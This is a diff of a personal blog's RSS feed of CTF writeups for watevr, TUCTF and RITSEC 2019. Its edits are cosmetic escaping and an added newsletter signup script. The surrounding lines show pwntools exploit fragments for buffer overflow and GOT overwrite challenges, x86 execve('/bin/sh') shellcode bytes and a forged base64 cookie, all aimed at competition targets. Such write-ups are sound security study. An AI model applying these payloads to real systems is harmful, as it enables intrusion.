@@ -5,7 +5,7 @@
     <link>/tags/ctf/</link>
       <atom:link href="/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
     <description>ctf</description>
-    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Shreyansh Singh 2019</copyright><lastBuildDate>Sun, 15 Dec 2019 11:44:06 +0530</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Shreyansh Singh 2020</copyright><lastBuildDate>Sun, 15 Dec 2019 11:44:06 +0530</lastBuildDate>
     <image>
       <url>/img/Shreyansh.jpg</url>
       <title>ctf</title>
@@ -124,7 +124,7 @@
 
 &lt;/figure&gt;
 
-&lt;p&gt;Also, there is a loop which suggests that the string to be matched with is constructed character by character. I use dynamic analysis, setting a breakpoint at the strcmp call, and checking at each step and modifying our input accordingly. Although the process is a bit tedious, but I still managed to get the flag string. Anything works during the CTF, as long as you get the flag 😛.&lt;/p&gt;
+&lt;p&gt;Also, there is a loop which suggests that the string to be matched with is constructed character by character. I use dynamic analysis, setting a breakpoint at the strcmp call, and checking at each step and modifying our input accordingly. Although the process is a bit tedious, but I still managed to get the flag string. Anything works during the CTF, as long as you get the flag :stuck_out_tongue:.&lt;/p&gt;
 &lt;p&gt;PS - Before the dynamic analysis, we patch the &lt;code&gt;PTRACE_TRACEME&lt;/code&gt; call to jump to the required function.&lt;/p&gt;
 &lt;p&gt;The flag is - &lt;strong&gt;watevr{th4nk5_h4ck1ng_for_s0ju_hackingforsoju.team}&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt; &lt;/p&gt;
@@ -211,14 +211,14 @@
 &lt;/figure&gt;
 
 &lt;p&gt;&lt;code&gt;strtok&lt;/code&gt; is used here, which is used to split the string at some delimiter. And also, &lt;code&gt;atol&lt;/code&gt; is used to convert each such substring to a number. The delimiter here is 0x20, i.e. a space. So we have to supply our input &amp;ldquo;command&amp;rdquo; as space separated numbers.&lt;/p&gt;
-&lt;p&gt;We use dynamic analysis after we give our input, since all the precomputations are done, we don&#39;t have to worry about that. We jump straight to the function call to FUN_001011af. On a sample input of &lt;em&gt;10 11 12 13 14 15 16&lt;/em&gt;, the following parameters are passed -&lt;/p&gt;
+&lt;p&gt;We use dynamic analysis after we give our input, since all the precomputations are done, we don&amp;rsquo;t have to worry about that. We jump straight to the function call to FUN_001011af. On a sample input of &lt;em&gt;10 11 12 13 14 15 16&lt;/em&gt;, the following parameters are passed -&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;0x5555555551af (
    $rdi = 0x00007fffffffd370 → 0x000000000000000a,
    $rsi = 0x0000000000000040,
    $rdx = 0x0000000000000000,
    $rcx = 0x00007fffffffd350 → 0x000000000000008f
 )
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;i.e. the pointer to the numbers, the (number of space separeted numbers + 1)*8, 0 and a precomputed array&#39;s pointer, with the first element as 0x8f.&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;i.e. the pointer to the numbers, the (number of space separeted numbers + 1)*8, 0 and a precomputed array&amp;rsquo;s pointer, with the first element as 0x8f.&lt;/p&gt;
 &lt;p&gt;Now I analysed FUN_001011af, it has two malloc calls to get the buffer to store the decrypted string. After some basic checks, there is a call to FUN_00100dc3.&lt;/p&gt;
 
 
@@ -336,7 +336,7 @@
 
 &lt;/figure&gt;
 
-&lt;p&gt;The offset of the crash is calculated using gef&#39;s pattern create and pattern search functionality.&lt;/p&gt;
+&lt;p&gt;The offset of the crash is calculated using gef&amp;rsquo;s pattern create and pattern search functionality.&lt;/p&gt;
 &lt;p&gt;My exploit code -&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
 &lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
@@ -359,7 +359,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
     f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(payload)
 
 p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;strong&gt;watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_&lt;a href=&#34;https://www.youtube.com/watch?v=Va4aF6rRdqU&#34;&gt;https://www.youtube.com/watch?v=Va4aF6rRdqU&lt;/a&gt;}&lt;/strong&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;strong&gt;watevr{w3ll_th4t_w4s_pr3tty_tr1v1al_anyways_&lt;a href=&#34;https://www.youtube.com/watch?v=Va4aF6rRdqU%7D&#34;&gt;https://www.youtube.com/watch?v=Va4aF6rRdqU}&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt; &lt;/p&gt;
 &lt;h2 id=&#34;voting-machine-2&#34;&gt;Voting Machine 2&lt;/h2&gt;
 &lt;p&gt;File: &lt;a href=&#34;/post/2019-12-15_watevr-ctf-2019-writeups/files/kamikaze2&#34;&gt;kamikaze2&lt;/a&gt;&lt;/p&gt;
@@ -424,7 +424,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
     f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(pad(exploit))
 
 p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;strong&gt;watevr{GOT_som3_fl4g_for_you_&lt;a href=&#34;https://www.youtube.com/watch?v=hYeFcSq7Mxg&#34;&gt;https://www.youtube.com/watch?v=hYeFcSq7Mxg&lt;/a&gt;}&lt;/strong&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;strong&gt;watevr{GOT_som3_fl4g_for_you_&lt;a href=&#34;https://www.youtube.com/watch?v=hYeFcSq7Mxg%7D&#34;&gt;https://www.youtube.com/watch?v=hYeFcSq7Mxg}&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h1 id=&#34;other-categories&#34;&gt;Other categories&lt;/h1&gt;
 &lt;h2 id=&#34;misc---unspaellablle&#34;&gt;Misc - Unspaellablle&lt;/h2&gt;
@@ -463,7 +463,44 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 &lt;p&gt;We see that the &lt;em&gt;Flag&lt;/em&gt; cookie is for 100$, so if we set the cookie to base64({&amp;ldquo;money&amp;rdquo;: 200, &amp;ldquo;history&amp;rdquo;: []}), i.e. &lt;strong&gt;eyJtb25leSI6IDIwMCwgImhpc3RvcnkiOiBbXX0=&lt;/strong&gt;.  With this our balance gets updated. Now we can buy the flag cookie and get the flag.&lt;/p&gt;
 &lt;p&gt;The flag is - &lt;strong&gt;watevr{b64_15_4_6r347_3ncryp710n_m37h0d}&lt;/strong&gt;&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;That&#39;s all for now. Those were the problems I solved during the CTF. There were a few more Rev problems that I spent a huge amount of time on, but couldn&#39;t solve. I will add my version of their writeups when I get to know their solution.&lt;/p&gt;
+&lt;p&gt;That&amp;rsquo;s all for now. Those were the problems I solved during the CTF. There were a few more Rev problems that I spent a huge amount of time on, but couldn&amp;rsquo;t solve. I will add my version of their writeups when I get to know their solution.&lt;/p&gt;
+&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
+&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
+&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;a id=&#34;openpopup&#34; class=&#34;example_a&#34; rel=&#34;nofollow noopener&#34;&gt;Subscribe to my posts!&lt;/a&gt;&lt;/div&gt;
+&lt;style&gt;
+    .example_a {
+        color: #fff !important;
+        text-transform: uppercase;
+        text-decoration: none;
+        background: #3f51b5;
+        padding: 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        display: inline-block;
+        border: none;
+        transition: all 0.4s ease 0s;
+    }
+
+    .example_a:hover {
+        background: #434343;
+        letter-spacing: 1px;
+        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
+        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
+        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
+        transition: all 0.4s ease 0s;
+    }
+&lt;/style&gt;
+&lt;script type=&#34;text/javascript&#34;&gt;
+
+function showMailingPopUp() {
+    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })
+
+    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
+}
+
+document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};
+
+&lt;/script&gt;
 &lt;p&gt; &lt;/p&gt;
 &lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
 </description>
@@ -474,7 +511,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
       <link>/post/2019-12-02_tuctf-pwn-2019/</link>
       <pubDate>Mon, 02 Dec 2019 19:39:57 +0530</pubDate>
       <guid>/post/2019-12-02_tuctf-pwn-2019/</guid>
-      <description>&lt;p&gt;I couldn&#39;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.&lt;/p&gt;
+      <description>&lt;p&gt;I couldn&amp;rsquo;t give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.&lt;/p&gt;
 &lt;hr&gt;
 &lt;h1 id=&#34;pwn-challenges&#34;&gt;Pwn Challenges&lt;/h1&gt;
 &lt;h2 id=&#34;thefirst---379-pts&#34;&gt;thefirst - 379 pts&lt;/h2&gt;
@@ -602,7 +639,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 
 &lt;/figure&gt;
 
-&lt;p&gt;We use &lt;a href=&#34;http://shell-storm.org/shellcode/files/shellcode-811.php&#34;&gt;shell-storm&lt;/a&gt; to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with &amp;lsquo;A&#39;s and then provide the address to write to, i.e. the adress provided to us.&lt;/p&gt;
+&lt;p&gt;We use &lt;a href=&#34;http://shell-storm.org/shellcode/files/shellcode-811.php&#34;&gt;shell-storm&lt;/a&gt; to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with &amp;lsquo;A&amp;rsquo;s and then provide the address to write to, i.e. the adress provided to us.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x50&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x2f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x2f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x73&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x2f&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x62&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x69&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x6e&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe3&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc2&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xcd&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x80&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x40&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xcd&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x80&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
 len_shell_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;
 
@@ -716,9 +753,9 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 
 &lt;/figure&gt;
 
-&lt;p&gt;This is intereting as both these addresses are also present in the program&#39;s output with our input.&lt;/p&gt;
+&lt;p&gt;This is intereting as both these addresses are also present in the program&amp;rsquo;s output with our input.&lt;/p&gt;
 &lt;p&gt;So, all we have to do is overwrite the 6th and 7th &amp;ldquo;addresses&amp;rdquo; of the output to the same value so that the string comparison passes.&lt;/p&gt;
-&lt;p&gt;We write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now ☹) -&lt;/p&gt;
+&lt;p&gt;We write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now :frowning_face:) -&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
 
 p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;printfun&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
@@ -894,7 +931,7 @@ flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#3
 &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag - &lt;code&gt;TUCTF{c0r3_dump?_N3v3r_h34rd_0f_y0u}&lt;/code&gt;&lt;/p&gt;
 &lt;hr&gt;
-&lt;p&gt;That&#39;s all for now 👋.&lt;/p&gt;
+&lt;p&gt;That&amp;rsquo;s all for now :wave:.&lt;/p&gt;
 </description>
     </item>
     
@@ -905,7 +942,7 @@ flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#3
       <guid>/post/2019-11-19_ritsec-ctf-2019/</guid>
       <description>&lt;p&gt;A bit late for writeups, but still here are the solutions to the challenges I solved during the CTF. The CTF was from 15 Nov. 2019, 22:30 IST — Mon, 18 Nov. 2019, 10:30 IST. It was a decent CTF with quality challenges, from both beginner to advanced level.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: The scripts to solve and the flags are present in &lt;a href=&#34;https://github.com/wr47h/CTF-Writeups/tree/master/2019/RITSEC%20CTF%202019&#34;&gt;this repo&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;I&#39;ll do the writeups category-wise -&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;ll do the writeups category-wise -&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;crypto&#34;&gt;Crypto&lt;/h2&gt;
 &lt;p&gt; &lt;br&gt;
@@ -1009,7 +1046,7 @@ flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span styl
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is — &lt;strong&gt;RITSEC{0n1On_L4y3R}&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt; &lt;br&gt;
 &lt;strong&gt;AlPhAbEtIcAl Challenge - 100pts&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;I couldn&#39;t solve this during the CTF, but saw other writeups and found that it was actually pretty interesting. The cipher text that is provided is —&lt;/p&gt;
+&lt;p&gt;I couldn&amp;rsquo;t solve this during the CTF, but saw other writeups and found that it was actually pretty interesting. The cipher text that is provided is —&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;59:87:57:51:85:80{:40:50:56:08:82:58:81:08:18:85:57:87:48:85:88:40:50:56:59:15:56:11:18:85:59:51:}&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -1019,7 +1056,7 @@ flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span styl
 &lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;
 &lt;p&gt; &lt;br&gt;
 &lt;strong&gt;misdirection — 100 pts&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;We are given a URL — &lt;a href=&#34;http://ctfchallenges.ritsec.club:5000/&#34;&gt;http://ctfchallenges.ritsec.club:5000/&lt;/a&gt; However, on clicking it we see that we are directed to another webpage &lt;a href=&#34;http://ctfchallenges.ritsec.club:5000/n&#34;&gt;http://ctfchallenges.ritsec.club:5000/n&lt;/a&gt; and the information that the webpage isn&#39;t redirecting properly. So, I decided to see what is happening, for that I did a simple &lt;em&gt;wget&lt;/em&gt; to the url.&lt;/p&gt;
+&lt;p&gt;We are given a URL — &lt;a href=&#34;http://ctfchallenges.ritsec.club:5000/&#34;&gt;http://ctfchallenges.ritsec.club:5000/&lt;/a&gt; However, on clicking it we see that we are directed to another webpage &lt;a href=&#34;http://ctfchallenges.ritsec.club:5000/n&#34;&gt;http://ctfchallenges.ritsec.club:5000/n&lt;/a&gt; and the information that the webpage isn&amp;rsquo;t redirecting properly. So, I decided to see what is happening, for that I did a simple &lt;em&gt;wget&lt;/em&gt; to the url.&lt;/p&gt;
 
 
 
